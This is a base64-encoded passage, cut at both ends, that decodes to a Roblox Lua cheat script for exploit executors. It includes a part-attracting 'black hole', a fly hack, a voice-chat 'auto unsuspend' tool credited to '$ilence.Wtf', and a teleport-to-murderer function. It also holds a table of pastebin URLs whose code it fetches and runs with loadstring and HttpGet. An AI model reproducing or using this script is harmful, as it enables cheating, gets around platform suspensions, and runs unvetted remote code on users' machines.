ENoaWxkKCJBbGlnblBvc2l0aW9uIik6RGVzdHJveSgpCiAgICAgICAgZW5kCiAgICAgICAgaWYgdjpGaW5kRmlyc3RDaGlsZCgiVG9ycXVlIikgdGhlbgogICAgICAgICAgICB2OkZpbmRGaXJzdENoaWxkKCJUb3JxdWUiKTpEZXN0cm95KCkKICAgICAgICBlbmQKICAgICAgICB2LkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgIAogICAgICAgIGxvY2FsIFRvcnF1ZSA9IEluc3RhbmNlLm5ldygiVG9ycXVlIiwgdikKICAgICAgICBUb3JxdWUuVG9ycXVlID0gVmVjdG9yMy5uZXcoMTAwMDAwMCwgMTAwMDAwMCwgMTAwMDAwMCkKICAgICAgICBsb2NhbCBBbGlnblBvc2l0aW9uID0gSW5zdGFuY2UubmV3KCJBbGlnblBvc2l0aW9uIiwgdikKICAgICAgICBsb2NhbCBBdHRhY2htZW50MiA9IEluc3RhbmNlLm5ldygiQXR0YWNobWVudCIsIHYpCiAgICAgICAgVG9ycXVlLkF0dGFjaG1lbnQwID0gQXR0YWNobWVudDIKICAgICAgICBBbGlnblBvc2l0aW9uLk1heEZvcmNlID0gbWF0aC5odWdlCiAgICAgICAgQWxpZ25Qb3NpdGlvbi5NYXhWZWxvY2l0eSA9IG1hdGguaHVnZQogICAgICAgIEFsaWduUG9zaXRpb24uUmVzcG9uc2l2ZW5lc3MgPSA1MDAKICAgICAgICBBbGlnblBvc2l0aW9uLkF0dGFjaG1lbnQwID0gQXR0YWNobWVudDIKICAgICAgICBBbGlnblBvc2l0aW9uLkF0dGFjaG1lbnQxID0gQXR0YWNobWVudDEKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIHRvZ2dsZUJsYWNrSG9sZSgpCiAgICBibGFja0hvbGVBY3RpdmUgPSBub3QgYmxhY2tIb2xlQWN0aXZlCiAgICBpZiBibGFja0hvbGVBY3RpdmUgdGhlbgogICAgICAgIGZvciBfLCB2IGluIG5leHQsIFdvcmtzcGFjZTpHZXREZXNjZW5kYW50cygpIGRvCiAgICAgICAgICAgIEZvcmNlUGFydCh2KQogICAgICAgIGVuZAoKICAgICAgICBXb3Jrc3BhY2UuRGVzY2VuZGFudEFkZGVkOkNvbm5lY3QoZnVuY3Rpb24odikKICAgICAgICAgICAgaWYgYmxhY2tIb2xlQWN0aXZlIHRoZW4KICAgICAgICAgICAgICAgIEZvcmNlUGFydCh2KQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCgogICAgICAgIHNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgYmxhY2tIb2xlQWN0aXZlIGFuZCBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6V2FpdCgpIGRvCiAgICAgICAgICAgICAgICBhbmdsZSA9IGFuZ2xlICsgbWF0aC5yYWQoMikKCiAgICAgICAgICAgICAgICBsb2NhbCBvZmZzZXRYID0gbWF0aC5jb3MoYW5nbGUpICogcmFkaXVzCiAgICAgICAgICAgICAgICBsb2NhbCBvZmZzZXRaID0gbWF0aC5zaW4oYW5nbGUpICogcmFkaXVzCgogICAgICAgICAgICAgICAgQXR0YWNobWVudDEuV29ybGRDRnJhbWUgPSBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSAqIENGcmFtZS5uZXcob2Zmc2V0WCwgMCwgb2Zmc2V0WikKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZWxzZQogICAgICAgIEF0dGFjaG1lbnQxLldvcmxkQ0ZyYW1lID0gQ0ZyYW1lLm5ldygwLCAtMTAwMCwgMCkKICAgIGVuZAplbmQKCkxvY2FsUGxheWVyLkNoYXJhY3RlckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgaHVtYW5vaWRSb290UGFydCwgQXR0YWNobWVudDEgPSBzZXR1cFBsYXllcigpCiAgICBpZiBibGFja0hvbGVBY3RpdmUgdGhlbgogICAgICAgIHRvZ2dsZUJsYWNrSG9sZSgpCiAgICBlbmQKZW5kKQoKICAgLS1yYWRpdXMgPSBWYWx1ZQoKCnNwYXduKGZ1bmN0aW9uKCkKICAgIHdoaWxlIHRydWUgZG8KICAgICAgICBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6V2FpdCgpCiAgICAgICAgaWYgYmxhY2tIb2xlQWN0aXZlIHRoZW4KICAgICAgICAgICAgYW5nbGUgPSBhbmdsZSArIG1hdGgucmFkKGFuZ2xlU3BlZWQpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKVGFiMjpDcmVhdGVUb2dnbGUoewogICAgTmFtZSA9ICJQYXJ0IEJsYWNrIEhvbGUgKEZFKSIsCiAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgdG9nZ2xlQmxhY2tIb2xlKHZhbHVlKQogICAgZW5kCn0pCl1dCgpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCBDaGFyYWN0ZXIgPSBQbGF5ZXIuQ2hhcmFjdGVyIG9yIFBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKbG9jYWwgSHVtYW5vaWQgPSBDaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZCIpCmxvY2FsIFJvb3QgPSBDaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKbG9jYWwgQ2FtZXJhID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKbG9jYWwgVXNlcklucHV0U2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiVXNlcklucHV0U2VydmljZSIpCmxvY2FsIFJ1blNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKQoKbG9jYWwgZmx5aW5nID0gZmFsc2UKbG9jYWwgc3BlZWQgPSA1MCAKbG9jYWwgb3JpZ2luYWxXYWxrU3BlZWQgPSBIdW1hbm9pZC5XYWxrU3BlZWQKbG9jYWwgb3JpZ2luYWxKdW1wUG93ZXIgPSBIdW1hbm9pZC5KdW1wUG93ZXIKCmxvY2FsIHBsYXRmb3JtID0gbmlsCmxvY2FsIHdlbGQgPSBuaWwKbG9jYWwgYm9keWd5cm8gPSBuaWwKCmxvY2FsIGtleXMgPSB7VyA9IGZhbHNlLCBBID0gZmFsc2UsIFMgPSBmYWxzZSwgRCA9IGZhbHNlLCBTcGFjZSA9IGZhbHNlLCBMZWZ0Q29udHJvbCA9IGZhbHNlfQoKbG9jYWwgZnVuY3Rpb24gc2V0Rmx5aW5nKHN0YXRlKQogICAgZmx5aW5nID0gc3RhdGUKICAgIGlmIGZseWluZyB0aGVuCiAgICAgICAgcGxhdGZvcm0gPSBJbnN0YW5jZS5uZXcoIlBhcnQiKQogICAgICAgIHBsYXRmb3JtLk5hbWUgPSAiSW52aXNpYmxlUGxhdGZvcm0iCiAgICAgICAgcGxhdGZvcm0uVHJhbnNwYXJlbmN5ID0gMQogICAgICAgIHBsYXRmb3JtLlNpemUgPSBWZWN0b3IzLm5ldyg0LCAxLCA0KQogICAgICAgIHBsYXRmb3JtLkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgIHBsYXRmb3JtLkFuY2hvcmVkID0gdHJ1ZSAKICAgICAgICBwbGF0Zm9ybS5QYXJlbnQgPSB3b3Jrc3BhY2UKCiAgICAgICAgbG9jYWwgb2Zmc2V0ID0gQ0ZyYW1lLm5ldygwLCAtKFJvb3QuU2l6ZS5ZIC8gMiArIHBsYXRmb3JtLlNpemUuWSAvIDIgKyAwLjA1KSwgMCkKICAgICAgICBwbGF0Zm9ybS5DRnJhbWUgPSBSb290LkNGcmFtZSAqIG9mZnNldAoKICAgICAgICB3ZWxkID0gSW5zdGFuY2UubmV3KCJXZWxkQ29uc3RyYWludCIpCiAgICAgICAgd2VsZC5QYXJ0MCA9IFJvb3QKICAgICAgICB3ZWxkLlBhcnQxID0gcGxhdGZvcm0KICAgICAgICB3ZWxkLlBhcmVudCA9IHBsYXRmb3JtCgogICAgICAgIHBsYXRmb3JtLkFuY2hvcmVkID0gZmFsc2UKCiAgICAgICAgYm9keWd5cm8gPSBJbnN0YW5jZS5uZXcoIkJvZHlHeXJvIikKICAgICAgICBib2R5Z3lyby5NYXhUb3JxdWUgPSBWZWN0b3IzLm5ldygxZTUsIDFlNSwgMWU1KQogICAgICAgIGJvZHlneXJvLlAgPSAzMDAwCiAgICAgICAgYm9keWd5cm8uUGFyZW50ID0gcGxhdGZvcm0KCiAgICAgICAgSHVtYW5vaWQuV2Fsa1NwZWVkID0gMAogICAgICAgIEh1bWFub2lkLkp1bXBQb3dlciA9IDAKICAgICAgICBIdW1hbm9pZDpDaGFuZ2VTdGF0ZShFbnVtLkh1bWFub2lkU3RhdGVUeXBlLlBoeXNpY3MpCiAgICBlbHNlCiAgICAgICAgaWYgYm9keWd5cm8gdGhlbiBib2R5Z3lybzpEZXN0cm95KCkgYm9keWd5cm8gPSBuaWwgZW5kCiAgICAgICAgaWYgd2VsZCB0aGVuIHdlbGQ6RGVzdHJveSgpIHdlbGQgPSBuaWwgZW5kCiAgICAgICAgaWYgcGxhdGZvcm0gdGhlbiBwbGF0Zm9ybTpEZXN0cm95KCkgcGxhdGZvcm0gPSBuaWwgZW5kCgogICAgICAgIEh1bWFub2lkLldhbGtTcGVlZCA9IG9yaWdpbmFsV2Fsa1NwZWVkCiAgICAgICAgSHVtYW5vaWQuSnVtcFBvd2VyID0gb3JpZ2luYWxKdW1wUG93ZXIKICAgICAgICBIdW1hbm9pZDpDaGFuZ2VTdGF0ZShFbnVtLkh1bWFub2lkU3RhdGVUeXBlLkdldHRpbmdVcCkKICAgIGVuZAplbmQKClVzZXJJbnB1dFNlcnZpY2UuSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0LCBncGUpCiAgICBpZiBncGUgdGhlbiByZXR1cm4gZW5kCiAgICBpZiBpbnB1dC5LZXlDb2RlID09IEVudW0uS2V5Q29kZS5GIHRoZW4KICAgICAgICBzZXRGbHlpbmcobm90IGZseWluZykKICAgIGVuZAoKICAgIGlmIGZseWluZyBhbmQga2V5c1tpbnB1dC5LZXlDb2RlLk5hbWVdIH49IG5pbCB0aGVuCiAgICAgICAga2V5c1tpbnB1dC5LZXlDb2RlLk5hbWVdID0gdHJ1ZQogICAgZW5kCmVuZCkKClVzZXJJbnB1dFNlcnZpY2UuSW5wdXRFbmRlZDpDb25uZWN0KGZ1bmN0aW9uKGlucHV0LCBncGUpCiAgICBpZiBncGUgdGhlbiByZXR1cm4gZW5kCiAgICBpZiBrZXlzW2lucHV0LktleUNvZGUuTmFtZV0gfj0gbmlsIHRoZW4KICAgICAgICBrZXlzW2lucHV0LktleUNvZGUuTmFtZV0gPSBmYWxzZQogICAgZW5kCmVuZCkKClJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpDb25uZWN0KGZ1bmN0aW9uKGR0KQogICAgaWYgZmx5aW5nIHRoZW4KICAgICAgICBsb2NhbCBjYW1DRnJhbWUgPSBDYW1lcmEuQ0ZyYW1lCiAgICAgICAgYm9keWd5cm8uQ0ZyYW1lID0gY2FtQ0ZyYW1lIAoKICAgICAgICBsb2NhbCB2ZWwgPSBWZWN0b3IzLm5ldygwLCAwLCAwKQogICAgICAgIGlmIGtleXMuVyB0aGVuIHZlbCA9IHZlbCArIGNhbUNGcmFtZS5Mb29rVmVjdG9yIGVuZAogICAgICAgIGlmIGtleXMuUyB0aGVuIHZlbCA9IHZlbCAtIGNhbUNGcmFtZS5Mb29rVmVjdG9yIGVuZAogICAgICAgIGlmIGtleXMuQSB0aGVuIHZlbCA9IHZlbCAtIGNhbUNGcmFtZS5SaWdodFZlY3RvciBlbmQKICAgICAgICBpZiBrZXlzLkQgdGhlbiB2ZWwgPSB2ZWwgKyBjYW1DRnJhbWUuUmlnaHRWZWN0b3IgZW5kCiAgICAgICAgaWYga2V5cy5TcGFjZSB0aGVuIHZlbCA9IHZlbCArIFZlY3RvcjMubmV3KDAsIDEsIDApIGVuZAogICAgICAgIGlmIGtleXMuTGVmdENvbnRyb2wgdGhlbiB2ZWwgPSB2ZWwgLSBWZWN0b3IzLm5ldygwLCAxLCAwKSBlbmQKCiAgICAgICAgaWYgdmVsLk1hZ25pdHVkZSA+IDAgdGhlbgogICAgICAgICAgICB2ZWwgPSB2ZWwuVW5pdCAqIHNwZWVkCiAgICAgICAgZW5kCgogICAgICAgIHBsYXRmb3JtLlZlbG9jaXR5ID0gdmVsCiAgICBlbmQKZW5kKQoKVGFiMjpDcmVhdGVUb2dnbGUoewogICAgTmFtZSA9ICJGbHkgKFVORCkiLAogICAgQ3VycmVudFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHZhbHVlKQogICAgICAgIHNldEZseWluZyh2YWx1ZSkKICAgIGVuZAp9KQoKVGFiNzpDcmVhdGVMYWJlbCh7CiAgICBOYW1lID0gIlZvaWNlIENoYXQiLAp9KQoKLS1bWyAKJGlsZW5jZS5XdGYgQXV0byBVbnN1c3BlbmQgKEZhc3Rlc3QgTWV0aG9kKSAyMDI1IFYxLjAuMQogICAgZGlzY29yZC5nZy9kak1RUkNOQUFaCl1dCgotLSBHZXQgVm9pY2VDaGF0SW50ZXJuYWwgc2FmZWx5CmxvY2FsIHN1Y2Nlc3MsIFZvaWNlQ2hhdEludGVybmFsID0gcGNhbGwoZ2FtZS5HZXRTZXJ2aWNlLCBnYW1lLCAiVm9pY2VDaGF0SW50ZXJuYWwiKQppZiBub3Qgc3VjY2VzcyB0aGVuCiAgICB3YXJuKCJb8J+UhyAkaWxlbmNlLld0Zl0gVm9pY2VDaGF0SW50ZXJuYWwgaXMgbm90IGF2YWlsYWJsZSBpbiB0aGlzIGV4ZWN1dG9yLiIpCiAgICByZXR1cm4KZW5kCgpsb2NhbCBJc1ZjRW5hYmxlZCA9IGZhbHNlCmxvY2FsIHNlbGVjdGVkTWV0aG9kID0gIkNvbXBhdGlibGUgTWV0aG9kIgpsb2NhbCBsYXN0QXR0ZW1wdFRpbWUgPSAwLjIKbG9jYWwgYXR0ZW1wdENvb2xkb3duID0gMSAgLS0gTWluaW11bSB0aW1lIGJldHdlZW4gYXR0ZW1wdHMgKHNlY29uZHMpCgpsb2NhbCBmdW5jdGlvbiBWY0NoZWNrZXIoKQogICAgbG9jYWwgY3VycmVudFRpbWUgPSB0aWNrKCkKICAgIGlmIGN1cnJlbnRUaW1lIC0gbGFzdEF0dGVtcHRUaW1lIDwgYXR0ZW1wdENvb2xkb3duIHRoZW4KICAgICAgICByZXR1cm4KICAgIGVuZAoKICAgIGxvY2FsIFZjU3RhdGUgPSBWb2ljZUNoYXRJbnRlcm5hbC5Wb2ljZUNoYXRTdGF0ZQogICAgaWYgVmNTdGF0ZSB+PSBFbnVtLlZvaWNlQ2hhdFN0YXRlLkpvaW5lZCB0aGVuCiAgICAgICAgd2FybigiW/CflIcgJGlsZW5jZS5XdGYgKCIgLi4gc2VsZWN0ZWRNZXRob2QgLi4gIildIFZvaWNlIGNoYXQgaXMgbm90IGFjdGl2ZS4gQXR0ZW1wdGluZyB0byBqb2luLi4uIikKICAgICAgICBsYXN0QXR0ZW1wdFRpbWUgPSBjdXJyZW50VGltZQoKICAgICAgICBsb2NhbCBqb2luU3VjY2VzcywgZXJyb3JNc2cgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgIC0tIFRyeSBib3RoIG1ldGhvZHMgZm9yIGNvbXBhdGliaWxpdHkKICAgICAgICAgICAgVm9pY2VDaGF0SW50ZXJuYWw6Sm9pbkJ5R3JvdXBJZFRva2VuKCcnLCBmYWxzZSwgdHJ1ZSkKICAgICAgICAgICAgVm9pY2VDaGF0SW50ZXJuYWw6Sm9pbkJ5R3JvdXBJZCgnJywgZmFsc2UpCiAgICAgICAgZW5kKQoKICAgICAgICBpZiBqb2luU3VjY2VzcyB0aGVuCiAgICAgICAgICAgIHByaW50KCJb8J+UiiAkaWxlbmNlLld0ZiAoIiAuLiBzZWxlY3RlZE1ldGhvZCAuLiAiKV0gU3VjY2Vzc2Z1bGx5IGpvaW5lZCB2b2ljZSBjaGF0ISIpCiAgICAgICAgZWxzZQogICAgICAgICAgICB3YXJuKCJb8J+UhyAkaWxlbmNlLld0ZiAoIiAuLiBzZWxlY3RlZE1ldGhvZCAuLiAiKV0gRmFpbGVkIHRvIGpvaW4gdm9pY2UgY2hhdDogIiAuLiB0b3N0cmluZyhlcnJvck1zZykpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBTZW5kTm90aSgpCiAgICBpZiBOb3RpZmljYXRpb25MaWIgYW5kIHR5cGVvZihOb3RpZmljYXRpb25MaWIuTm90aWZ5KSA9PSAiZnVuY3Rpb24iIHRoZW4KICAgICAgICBOb3RpZmljYXRpb25MaWIuTm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAiJGlsZW5jZS5XdGYiLAogICAgICAgICAgICBDb250ZW50ID0gIkF1dG8gVW5zdXNwZW5kIFZvaWNlIENoYXQgKCIgLi4gc2VsZWN0ZWRNZXRob2QgLi4gIilcbkhhcyBTdWNjZXNzZnVsbHkgTG9hZGVkISIsCiAgICAgICAgICAgIER1cmF0aW9uID0gNgogICAgICAgIH0pCiAgICBlbHNlCiAgICAgICAgcHJpbnQoIlvwn5SKICRpbGVuY2UuV3RmXSBOb3RpZmljYXRpb25MaWIgbm90IGF2YWlsYWJsZSwgdXNpbmcgcHJpbnQgaW5zdGVhZC4iKQogICAgZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gU2VuZE5vdGlEaXNhYmxlKCkKICAgIGlmIE5vdGlmaWNhdGlvbkxpYiBhbmQgdHlwZW9mKE5vdGlmaWNhdGlvbkxpYi5Ob3RpZnkpID09ICJmdW5jdGlvbiIgdGhlbgogICAgICAgIE5vdGlmaWNhdGlvbkxpYi5Ob3RpZnkoewogICAgICAgICAgICBUaXRsZSA9ICIkaWxlbmNlLld0ZiIsCiAgICAgICAgICAgIENvbnRlbnQgPSAiQXV0byBVbnN1c3BlbmQgVm9pY2UgQ2hhdCAoIiAuLiBzZWxlY3RlZE1ldGhvZCAuLiAiKVxuSGFzIFN1Y2Nlc3NmdWxseSBEaXNhYmxlZCEiLAogICAgICAgICAgICBEdXJhdGlvbiA9IDYKICAgICAgICB9KQogICAgZWxzZQogICAgICAgIHByaW50KCJb8J+UhyAkaWxlbmNlLld0Zl0gQXV0byBVbnN1c3BlbmQgZGlzYWJsZWQuIikKICAgIGVuZAplbmQKCi0tIFN0YXRlIG1hbmFnZW1lbnQKbG9jYWwgQ3VycmVudFZhbHVlID0gZmFsc2UKCmxvY2FsIGF1dG9VbnN1c3BlbmRUb2dnbGUgPSBUYWI3OkNyZWF0ZVRvZ2dsZSh7CiAgICBOYW1lID0gIkF1dG8gVW5zdXNwZW5kICgiIC4uIHNlbGVjdGVkTWV0aG9kIC4uICIpIiwKICAgIEN1cnJlbnRWYWx1ZSA9IEN1cnJlbnRWYWx1ZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgQ3VycmVudFZhbHVlID0gdmFsdWUKICAgICAgICBJc1ZjRW5hYmxlZCA9IHZhbHVlCiAgICAgICAgaWYgSXNWY0VuYWJsZWQgdGhlbgogICAgICAgICAgICBTZW5kTm90aSgpCiAgICAgICAgICAgIHdoaWxlIElzVmNFbmFibGVkIGRvCiAgICAgICAgICAgICAgICBWY0NoZWNrZXIoKQogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMykKICAgICAgICAgICAgZW5kCiAgICAgICAgZWxzZQogICAgICAgICAgICBTZW5kTm90aURpc2FibGUoKQogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBDcmVhdGUgZHJvcGRvd24KVGFiNzpDcmVhdGVEcm9wZG93bih7CiAgICBOYW1lID0gIlNlbGVjdCBNZXRob2QiLAogICAgT3B0aW9ucyA9IHsiRmFzdGVzdCBNZXRob2QiLCAiQ29tcGF0aWJsZSBNZXRob2QifSwKICAgIEN1cnJlbnRPcHRpb24gPSB7IkNvbXBhdGlibGUgTWV0aG9kIn0sCiAgICBNdWx0aXBsZU9wdGlvbnMgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc2VsZWN0ZWQpCiAgICAgICAgc2VsZWN0ZWRNZXRob2QgPSBzZWxlY3RlZFsxXQogICAgICAgIGF1dG9VbnN1c3BlbmRUb2dnbGUuTmFtZSA9ICJBdXRvIFVuc3VzcGVuZCAoIiAuLiBzZWxlY3RlZE1ldGhvZCAuLiAiKSIKICAgICAgICBDdXJyZW50VmFsdWUgPSBmYWxzZQogICAgICAgIElzVmNFbmFibGVkID0gZmFsc2UKICAgICAgICBTZW5kTm90aURpc2FibGUoKQogICAgICAgIGlmIHR5cGVvZihhdXRvVW5zdXNwZW5kVG9nZ2xlLkNhbGxiYWNrKSA9PSAiZnVuY3Rpb24iIHRoZW4KICAgICAgICAgICAgYXV0b1Vuc3VzcGVuZFRvZ2dsZS5DYWxsYmFjayhmYWxzZSkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKbG9jYWwgZnVuY3Rpb24gU2VuZE5vdGlTdWNjZXNzKCkKICAgIE5vdGlmaWNhdGlvbkxpYi5Ob3RpZnkoewogICAgICAgIFRpdGxlID0gIiRpbGVuY2UuV3RmIiwKICAgICAgICBDb250ZW50ID0gIlZvaWNlIENoYXQgVW5zdXNwZW5kIChGYXN0ZXN0IE1ldGhvZClcbkhhcyBTdWNjZXNzZnVsbHkgVW5zdXNwZW5kZWQhIiwKICAgICAgICBEdXJhdGlvbiA9IDYKICAgIH0pCmVuZAoKbG9jYWwgZnVuY3Rpb24gU2VuZE5vdGlFcnJvcigpCiAgICBOb3RpZmljYXRpb25MaWIuTm90aWZ5KHsKICAgICAgICBUaXRsZSA9ICIkaWxlbmNlLld0ZiIsCiAgICAgICAgQ29udGVudCA9ICJWb2ljZSBDaGF0IFVuc3VzcGVuZCAoRmFzdGVzdCBNZXRob2QpXG5IYXMgU3VjY2Vzc2Z1bGx5IFVuc3VzcGVuZGVkISIsCiAgICAgICAgRHVyYXRpb24gPSA2CiAgICB9KQplbmQKClRhYjc6Q3JlYXRlQnV0dG9uKHsKICAgIE5hbWUgPSAiVm9pY2UgQ2hhdCBVbnN1c3BlbmQgKEZhc3Rlc3QgTWV0aG9kKSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBzdWNjZXNzLCBlcnJvck1zZyA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgVm9pY2VDaGF0SW50ZXJuYWw6Sm9pbkJ5R3JvdXBJZFRva2VuKCcnLCBmYWxzZSwgdHJ1ZSkKICAgICAgICAgICAgVm9pY2VDaGF0SW50ZXJuYWw6Sm9pbkJ5R3JvdXBJZCgnJywgZmFsc2UpCiAgICAgICAgZW5kKQoKICAgICAgICBpZiBzdWNjZXNzIHRoZW4KICAgICAgICAgICAgU2VuZE5vdGlTdWNjZXNzKCkKICAgICAgICBlbHNlCiAgICAgICAgICAgIFNlbmROb3RpRXJyb3IoKQogICAgICAgIGVuZAogICAgZW5kCn0pCgpsb2NhbCBmdW5jdGlvbiBTZW5kTm90aVN1Y2Nlc3MoKQogICAgTm90aWZpY2F0aW9uTGliLk5vdGlmeSh7CiAgICAgICAgVGl0bGUgPSAiJGlsZW5jZS5XdGYiLAogICAgICAgIENvbnRlbnQgPSAiVm9pY2UgQ2hhdCBVbnN1c3BlbmQgKENvbXBhdGlibGUgTWV0aG9kKVxuSGFzIFN1Y2Nlc3NmdWxseSBVbnN1c3BlbmRlZCEiLAogICAgICAgIER1cmF0aW9uID0gNgogICAgfSkKZW5kCgpsb2NhbCBmdW5jdGlvbiBTZW5kTm90aUVycm9yKCkKICAgIE5vdGlmaWNhdGlvbkxpYi5Ob3RpZnkoewogICAgICAgIFRpdGxlID0gIiRpbGVuY2UuV3RmIiwKICAgICAgICBDb250ZW50ID0gIlZvaWNlIENoYXQgVW5zdXNwZW5kIChDb21wYXRpYmxlIE1ldGhvZClcbkhhcyBTdWNjZXNzZnVsbHkgVW5zdXNwZW5kZWQhIiwKICAgICAgICBEdXJhdGlvbiA9IDYKICAgIH0pCmVuZAoKVGFiNzpDcmVhdGVCdXR0b24oewogICAgTmFtZSA9ICJWb2ljZSBDaGF0IFVuc3VzcGVuZCAoQ29tcGF0aWJsZSBNZXRob2QpIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHN1Y2Nlc3MsIGVycm9yTXNnID0gcGNhbGwoZnVuY3Rpb24oKQoJCWdhbWU6R2V0U2VydmljZSgiVm9pY2VDaGF0U2VydmljZSIpOmpvaW5Wb2ljZSgpCiAgICAgICAgZW5kKQoKICAgICAgICBpZiBzdWNjZXNzIHRoZW4KICAgICAgICAgICAgU2VuZE5vdGlTdWNjZXNzKCkKICAgICAgICBlbHNlCiAgICAgICAgICAgIFNlbmROb3RpRXJyb3IoKQogICAgICAgIGVuZAogICAgZW5kCn0pCgpsb2NhbCBNYXJrZXRwbGFjZVNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIk1hcmtldHBsYWNlU2VydmljZSIpCmxvY2FsIHN1Y2Nlc3MsIGluZm8gPSBwY2FsbChmdW5jdGlvbigpCiAgICByZXR1cm4gTWFya2V0cGxhY2VTZXJ2aWNlOkdldFByb2R1Y3RJbmZvKGdhbWUuUGxhY2VJZCkKZW5kKQpsb2NhbCBnYW1lTmFtZSA9IHN1Y2Nlc3MgYW5kIGluZm8uTmFtZSBvciAiVW5rbm93biBHYW1lIgoKVGFiMzpDcmVhdGVMYWJlbCh7CiAgICBOYW1lID0gZ2FtZU5hbWUKfSkKCmxvY2FsIEdhbWVTY3JpcHRzID0gewogICAgWzE3NTc0NjE4OTU5XSA9ICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcveDd0eWRtQ0EiLCAtLSBKdXN0IEEgQmFzZXBsYXRlCiAgICBbMTQyODIzMjkxXSA9ICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvYnVZaVNmajAiLCAtLSBNdXJkZXIgTXlzdGVyeSAyCglbNjg4NDMxOTE2OV0gPSAiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2pkVjN4U2NEIiwgLS0gTWljIFVwCglbMTg4MDgxMzUzMjJdID0gImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9lRkJ0anVURCIKCn0KCmxvY2FsIHNjcmlwdFVSTCA9IEdhbWVTY3JpcHRzW2dhbWUuUGxhY2VJZF0KaWYgc2NyaXB0VVJMIHRoZW4KICAgIGxvY2FsIHN1Y2Nlc3MsIHJlc3VsdCA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBSZXRyaWV2ZUZ1bmMgPSBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldChzY3JpcHRVUkwpKSgpCiAgICAgICAgaWYgdHlwZW9mKFJldHJpZXZlRnVuYykgPT0gImZ1bmN0aW9uIiB0aGVuCiAgICAgICAgICAgIFJldHJpZXZlRnVuYyhUYWJzKSAKICAgICAgICBlbmQKICAgIGVuZCkKICAgIGlmIG5vdCBzdWNjZXNzIHRoZW4KICAgICAgICB3YXJuKCJGYWlsZWQgdG8gbG9hZCBnYW1lIHNjcmlwdChzKToiLCByZXN1bHQpCiAgICBlbmQKZWxzZQogICAgd2FybigiTm8gVUkgc2NyaXB0IGNvbmZpZ3VyZWQgZm9yIHRoaXMgZ2FtZSBJRDoiLCBnYW1lLlBsYWNlSWQpCmVuZAoKVGFiNDpDcmVhdGVMYWJlbCh7CiAgICBOYW1lID0gIkFpbSIsCn0pCgpsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIGZ1bmN0aW9uIHRwVG9NdXJkZXJlcigpCmZvciBfLCBwbGF5ZXIgaW4gcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCmlmIHBsYXllciB+PSBMb2NhbFBsYXllciBhbmQgKHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiS25pZmUiKSBvciAocGxheWVyLkNoYXJhY3RlciBhbmQgcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiS25pZmUiKSkpIHRoZW4KaWYgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSBhbmQgcGxheWVyLkNoYXJhY3RlciBhbmQgcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gcGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSAqIENGcmFtZS5uZXcoMCwgMCwgLTMpCmVuZApicmVhawplbmQKZW5kCmVuZAoKLS0tLS0tLS0tLS0tLS0tL